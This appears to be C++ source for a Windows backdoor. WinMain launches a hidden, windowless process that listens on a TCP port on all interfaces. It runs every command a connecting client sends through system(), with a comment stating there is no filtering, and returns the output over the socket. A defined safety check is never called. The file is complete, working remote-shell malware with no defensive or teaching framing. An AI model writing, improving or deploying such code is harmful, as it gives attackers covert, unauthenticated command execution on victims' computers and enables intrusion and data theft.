#include "..\precomp.h"


std::string currentDir = "C:\\";

std::string getUserFilePath() {
    char userProfile[MAX_PATH];
    DWORD len = GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH);
    if (len == 0 || len > MAX_PATH) return "C:\\cmdout.txt";
    return std::string(userProfile) + "\\AppData\\Local\\Temp\\cmdout.txt";
}

bool isCommandSafe(const std::string& cmd) {
    return cmd.find_first_of("&|;") == std::string::npos;
}

void redirectConsoleToLog(const std::string& logFilePath) {
    static std::ofstream logFile(logFilePath, std::ios::app);  // append mode
    if (logFile.is_open()) {
        std::cout.rdbuf(logFile.rdbuf());
        std::cerr.rdbuf(logFile.rdbuf());
    }
}

void run_server() {
    redirectConsoleToLog("server.log");

    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    sockaddr_in serverAddr{}, clientAddr{};
    int clientSize = sizeof(clientAddr);
    char buffer[BUFFER_SIZE];
    std::string outputFilePath = getUserFilePath();

    std::cout << "[*] Starting server on port " << PORT << "...\n";

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[!] WSAStartup failed.\n";
        return;
    }

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "[!] Failed to create socket.\n";
        WSACleanup();
        return;
    }

    // Разрешаем повторное использование порта
    int opt = 1;
    setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(serverSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "[!] Bind failed. Error code: " << WSAGetLastError() << "\n";
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "[!] Listen failed.\n";
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    std::cout << "[+] Server listening on port " << PORT << "\n";

    while (true) {
        std::cout << "[*] Waiting for client...\n";
        clientSocket = accept(serverSocket, (SOCKADDR*)&clientAddr, &clientSize);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "[!] Accept failed.\n";
            continue;
        }

        std::cout << "[+] Client connected!\n";

        while (true) {
            ZeroMemory(buffer, BUFFER_SIZE);
            int bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0);
            if (bytesReceived <= 0) break;

            buffer[bytesReceived] = '\0';
            std::string cmd(buffer);
            std::cout << "[>] Received command: " << cmd << "\n";

            if (cmd == "exit") break;

            // Выполнение команды БЕЗ фильтрации
            if (cmd.substr(0, 2) == "cd") {
                std::string path = cmd.length() > 2 ? cmd.substr(2) : "";
                path.erase(0, path.find_first_not_of(" \t\""));
                path.erase(path.find_last_not_of(" \t\"") + 1);

                std::ofstream out(outputFilePath);

                if (path.empty()) {
                    // cd без аргументов — вывести текущую директорию
                    out << currentDir << "\n";
                }
                else {
                    std::string tempPath = currentDir + "\\" + path;
                    std::string testCmd = "cd /d \"" + tempPath + "\" >nul 2>&1";
                    if (system(testCmd.c_str()) == 0) {
                        char fullPath[MAX_PATH];
                        if (GetFullPathNameA(tempPath.c_str(), MAX_PATH, fullPath, NULL)) {
                            currentDir = std::string(fullPath);
                            out << "CD to " << currentDir << "\n";
                        }
                        else {
                            out << "[!] Failed to resolve path.\n";
                        }
                    }
                    else {
                        out << "[!] Invalid path.\n";
                    }
                }
            }
            else {
                // Все остальные команды
                std::string fullCmd = "cd /d \"" + currentDir + "\" && " + cmd + " > \"" + outputFilePath + "\" 2>&1";
                system(fullCmd.c_str());
            }

            std::ifstream file(outputFilePath);
            std::string line;
            while (std::getline(file, line)) {
                send(clientSocket, line.c_str(), line.size(), 0);
                //send(clientSocket, "\n", 1, 0);
            }
            send(clientSocket, "\n[done]\n", 8, 0);

            std::cout << "[*] Command executed and response sent.\n";
        }

        std::cout << "[-] Client disconnected.\n";
        closesocket(clientSocket);
    }

    closesocket(serverSocket);
    WSACleanup();
    std::cout << "[x] Server shutdown.\n";
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::thread(run_server).detach();
    // Минимальное "живое" окно без формы — можно оставить на паузе вечно
    while (true) Sleep(10000);
    return 0;
}
